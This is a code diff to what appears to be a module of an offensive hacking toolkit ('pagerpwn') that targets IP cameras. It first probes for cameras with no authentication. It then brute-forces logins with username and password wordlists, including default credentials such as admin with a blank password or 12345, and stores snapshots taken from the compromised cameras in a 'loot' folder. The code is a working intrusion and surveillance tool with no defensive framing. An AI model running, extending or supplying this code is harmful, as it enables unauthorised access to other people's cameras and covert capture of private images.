@@ -15,9 +15,11 @@ import time
 import socket
 import urllib.request
 import urllib.error
+from datetime import datetime
 
 SNAP_PATH = "/tmp/cam_snap.jpg"
 REFRESH_INTERVAL = 3
+SAVE_EVERY_N = 10  # save every Nth frame to loot
 
 # ── Wordlist loader ──────────────────────────────────────────────────────────
 _BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
@@ -56,7 +58,7 @@ def _login(ip, user, password):
             data=body,
             headers={"Content-Type": "application/json"},
         )
-        resp = urllib.request.urlopen(req, timeout=5, context=_SSL_CTX)
+        resp = urllib.request.urlopen(req, timeout=2, context=_SSL_CTX)
         text = resp.read().decode(errors="replace")
 
         data = json.loads(text)
@@ -67,11 +69,13 @@ def _login(ip, user, password):
         return None
 
 
-def _grab_snapshot(ip, token):
+def _grab_snapshot(ip, token=None):
     """Download a JPEG snapshot. Returns raw bytes or None."""
     for path in ["/cgi-bin/api.cgi", "/api.cgi"]:
         try:
-            url = f"https://{ip}{path}?cmd=Snap&channel=0&token={token}"
+            url = f"https://{ip}{path}?cmd=Snap&channel=0"
+            if token:
+                url += f"&token={token}"
             req = urllib.request.Request(url)
             resp = urllib.request.urlopen(req, timeout=10, context=_SSL_CTX)
             data = resp.read()
@@ -107,31 +111,53 @@ def run(config, ui_callback, stop_event, pager=None):
         return stats
 
     # ── Login ─────────────────────────────────────────────────────────────
-    # Use config overrides, or build from wordlists
-    cam_user = config.get("CAM_USER", "")
-    cam_pass = config.get("CAM_PASS", "")
-    if cam_user and cam_pass:
-        cred_list = [(cam_user, cam_pass)]
-    else:
-        users = _load_wordlist("usernames.txt") or ["admin", "root"]
-        passwords = _load_wordlist("passwords.txt") or ["", "admin", "12345"]
-        cred_list = [(u, p) for u in users for p in passwords]
-
-    ui_callback("[CAM SNAP]", f"Trying {len(cred_list)} creds...")
     token = None
     used_cred = ""
-    for user, pw in cred_list:
-        token = _login(target_ip, user, pw)
-        if token:
-            used_cred = f"{user}:{pw}" if pw else f"{user}:(blank)"
-            break
 
-    if token:
-        ui_callback("[CAM SNAP]", f"Token: {token[:12]}...")
+    # If camera probe already told us auth is open, skip brute-force
+    if config.get("CAM_OPEN"):
+        ui_callback("[CAM SNAP]", "Camera open — no auth needed")
+        time.sleep(0.5)
+        used_cred = "none (open)"
     else:
-        ui_callback("[CAM SNAP]", "Login failed")
-        time.sleep(2)
-        return stats
+        # Try tokenless snapshot first — maybe auth isn't needed
+        ui_callback("[CAM SNAP]", "Trying no-auth snapshot...")
+        test_jpeg = _grab_snapshot(target_ip)
+        if test_jpeg:
+            ui_callback("[CAM SNAP]", "No auth needed!")
+            used_cred = "none (open)"
+            time.sleep(0.3)
+        else:
+            # Need credentials — use stashed creds or brute-force
+            cam_user = config.get("CAM_USER", "")
+            cam_pass = config.get("CAM_PASS", "")
+            if cam_user and cam_pass:
+                cred_list = [(cam_user, cam_pass)]
+            else:
+                users = _load_wordlist("usernames.txt") or ["admin", "root"]
+                passwords = _load_wordlist("passwords.txt") or ["", "admin", "12345"]
+                cred_list = [(u, p) for u in users for p in passwords]
+
+            total = len(cred_list)
+            ui_callback("[CAM SNAP]", f"Trying {total} creds...")
+            for idx, (user, pw) in enumerate(cred_list, 1):
+                if stop_event and stop_event.is_set():
+                    break
+                cred_str = f"{user}:{pw}" if pw else f"{user}:(blank)"
+                ui_callback(f"[CAM SNAP] {idx}/{total}", f"Trying {cred_str}")
+                token = _login(target_ip, user, pw)
+                if token:
+                    used_cred = cred_str
+                    ui_callback("[CAM SNAP] AUTH OK!", f"Cred: {cred_str}")
+                    break
+
+            if stop_event and stop_event.is_set():
+                return stats
+            if not token:
+                ui_callback("[CAM SNAP]", "Login failed")
+                time.sleep(2)
+                return stats
+            ui_callback("[CAM SNAP]", f"Token: {token[:12]}...")
 
     # ── Grab first frame ──────────────────────────────────────────────────
     ui_callback("[CAM SNAP]", "Grabbing snapshot...")
@@ -143,10 +169,26 @@ def run(config, ui_callback, stop_event, pager=None):
         time.sleep(2)
         return stats
 
+    # ── Loot setup ────────────────────────────────────────────────────────
+    loot_dir = config.get("LOOT_DIR", "/mmc/root/loot/pagerpwn")
+    snap_loot_dir = os.path.join(loot_dir, "snapshots")
+    os.makedirs(snap_loot_dir, exist_ok=True)
+
+    def _save_to_loot(jpeg_data, frame_num):
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        fname = f"snap_{target_ip}_{ts}_f{frame_num}.jpg"
+        try:
+            with open(os.path.join(snap_loot_dir, fname), "wb") as lf:
+                lf.write(jpeg_data)
+            stats["saved"] = stats.get("saved", 0) + 1
+        except Exception:
+            pass
+
     # ── Display loop ──────────────────────────────────────────────────────
     with open(SNAP_PATH, "wb") as f:
         f.write(jpeg)
     stats["frames"] = 1
+    _save_to_loot(jpeg, 1)  # always save first frame
 
     pager.clear(0x0000)
     pager.draw_image_file_scaled(0, 0, 480, 222, SNAP_PATH)
@@ -172,12 +214,16 @@ def run(config, ui_callback, stop_event, pager=None):
                     f.write(new_jpeg)
                 stats["frames"] += 1
 
+                if stats["frames"] % SAVE_EVERY_N == 0:
+                    _save_to_loot(new_jpeg, stats["frames"])
+
+                saved = stats.get("saved", 0)
                 pager.clear(0x0000)
                 pager.draw_image_file_scaled(0, 0, 480, 222, SNAP_PATH)
                 pager.fill_rect(0, 0, 480, 14, 0x0000)
                 pager.draw_text(
                     2, 1,
-                    f"CAM LIVE  f:{stats['frames']}  [ANY BTN = EXIT]",
+                    f"LIVE f:{stats['frames']} s:{saved}  [ANY BTN = EXIT]",
                     pager.GREEN, 1,
                 )
                 pager.flip()
@@ -188,11 +234,21 @@ def run(config, ui_callback, stop_event, pager=None):
 
         time.sleep(0.05)
 
+    # Save last frame on exit too
+    try:
+        with open(SNAP_PATH, "rb") as f:
+            last_jpeg = f.read()
+        if last_jpeg:
+            _save_to_loot(last_jpeg, stats["frames"])
+    except Exception:
+        pass
+
     try:
         os.remove(SNAP_PATH)
     except Exception:
         pass
 
-    ui_callback("[CAM SNAP] DONE", f"{stats['frames']} frame(s) grabbed")
+    saved = stats.get("saved", 0)
+    ui_callback("[CAM SNAP] DONE", f"{stats['frames']} frames, {saved} saved")
     time.sleep(1)
     return stats
